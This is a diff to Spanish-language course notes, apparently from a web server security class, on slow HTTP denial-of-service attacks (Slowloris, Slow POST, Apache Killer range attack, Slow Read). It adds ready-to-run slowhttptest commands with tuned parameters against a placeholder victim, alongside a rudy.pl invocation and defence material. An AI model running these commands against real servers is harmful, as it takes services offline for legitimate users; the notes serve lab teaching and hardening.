@@ -1747,7 +1747,7 @@ Si el curl falla (queda parado), !funciona!. Cuando se para el ataque vuelve a f
 
 Consiste en enviar cabeceras http incompletas (sin el CRLF final que indica el final del header) de tal forma que el servidor no considera las sesiones estbalecidas pr completo y las deja abiertas, afectando al número de conexiones máximas configuradas.
 
-<img width="450" height="122" alt="imagen" src="https://github.com/user-attachments/assets/ee438378-336a-4ab5-9058-4b0715bc1f45" />
+<img width="654" height="114" alt="imagen" src="https://github.com/user-attachments/assets/dce91e6c-31c3-4f91-b35a-26bd1f5562fa" />
 
 
 Copiar el código de un repositorio: **https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl**
@@ -2130,7 +2130,8 @@ tail /var/log/apache2/access.log
 
 El ataque Slow HTTP POST (de la familia R-U-Dead-Yet) envía peticiones donde la cabecera HTTP anuncia un cuerpo de datos muy grande mediante Content-Length, pero luego el cuerpo se envía de forma extremadamente lenta o incompleta. Esto engaña al servidor, que mantiene la conexión abierta esperando los datos restantes que nunca llegan. Al saturar así todos los hilos de conexión disponibles del servidor con solicitudes pendientes, se consigue denegar el servicio a usuarios legítimos.
 
-<img width="504" height="174" alt="imagen" src="https://github.com/user-attachments/assets/0c77a9af-17bc-4d57-b5cf-5d75769390c4" />
+<img width="657" height="189" alt="imagen" src="https://github.com/user-attachments/assets/5d53b8ed-d5af-4db7-9583-15c6c238052a" />
+
 
 
 Crear archivo:
@@ -2306,7 +2307,7 @@ perl rudy.pl --t 10.11.48.175 -p 80 -c 200 -o 20
 
 Se crean numerosas peticiones superponiendo rangos de bytes en la cabecera agotando los recursos de memoria y CPU del servidor.
 
-<img width="499" height="221" alt="imagen" src="https://github.com/user-attachments/assets/3a8cb359-d6a1-49ba-b2ab-cb4b784cb2f9" />
+<img width="447" height="206" alt="imagen" src="https://github.com/user-attachments/assets/317aa710-0915-4eed-b1ac-15d3b24ef24e" />
 
 
 Crear archivo:
@@ -2329,7 +2330,7 @@ Pegar:
 
 En este caso se envían peticiones HTTP legítimas pero se ralentiza el proceso del lectura de la respuesta retrasando el envío del ACK.
 
-<img width="565" height="364" alt="imagen" src="https://github.com/user-attachments/assets/e63951ab-47b2-4880-869f-ebb554c19c55" />
+<img width="703" height="362" alt="imagen" src="https://github.com/user-attachments/assets/046637c1-6528-46dc-a75b-bcfbe7eae135" />
 
 
 **¿Cómo proteger el servicio ante este tipo de ataque?**
@@ -2380,6 +2381,15 @@ Técnicas de evasión:
 
 Los 4 tipos de ataques se pueden probar con **SlowHttpTest**:
 
+    -H → SlowLoris (Slow Headers)
+
+    -B → Slow POST (R-U-Dead-Yet)
+
+    -R → Range Attack (Apache Killer)
+
+    -X → Slow Read (Slow Reading)
+	
+
 - Slowhttptest (Carlos no lo recomienda, solo probamos):
 ```bash
 sudo apt install slowhttptest -y
@@ -2409,16 +2419,56 @@ curl: (7) Failed to connect to 10.11.48.175 port 80: Connection refused
 o se queda colgado.
 
 
-Otros ataques:
+Ejemplos de los ataques:
 ```bash
 #SlowLoris Mode:  Envía las cabeceras sin línea vacía de forma que el servidor espere eternamente
 slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://IP_VICTIMA -x 24 -p 3
 
+    -H → SlowLoris: Envía cabeceras incompletas
+
+    -c 1000 → 1000 conexiones simultáneas
+
+    -i 10 → 10 segundos entre envíos
+
+    -x 24 → 24 bytes por paquete (muy lento)
+
+    -p 3 → 3 segundos de timeout de conexión
+
 #Slow POST Mode: Reserva espacio para muchas consultas y las mantiene abiertas enviando datos lentamente
 slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u http://IP_VICTIMA -x 10 -p 3
+    -B → Slow POST: Anuncia cuerpo grande pero envía lento
+
+    -s 8192 → 8KB de Content-Length anunciado
+
+    -i 110 → 110 segundos entre envíos (muy lento)
+
+    -t POST → Usa método POST
+
+# Apache Killer Mode - Basado en rangos
+slowhttptest -c 500 -R -g -o apachekiller_stats -r 100 -t GET -u http://IP_VICTIMA -x 10 -p 2
+
+	-R → Range Attack: Envía múltiples cabeceras Range
+	
+	-c 500 → 500 conexiones (suficiente para consumir memoria)
+	
+	-r 100 → 100 conexiones/segundo (rápido para saturar)
+	
+	-x 10 → 10 bytes por paquete (mínimo para mantener)
+	
+	-p 2 → 2 segundos timeout (corto para reconexión rápida
 
 # SlowRead Mode: # Lectura lenta de respuestas con ventana TCP pequeña
 slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://IP_VICTIMA -p 3
+
+    -X → SlowRead: Lee respuestas muy lentamente
+
+    -w 512 → 512 bytes de ventana TCP (pequeña)
+
+    -y 1024 → 1KB de lectura por vez
+
+    -n 5 → 5 segundos entre lecturas
+
+    -z 32 → 32 bytes por lectura (muy poco)
 ```
 
 <br>
@@ -2834,6 +2884,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
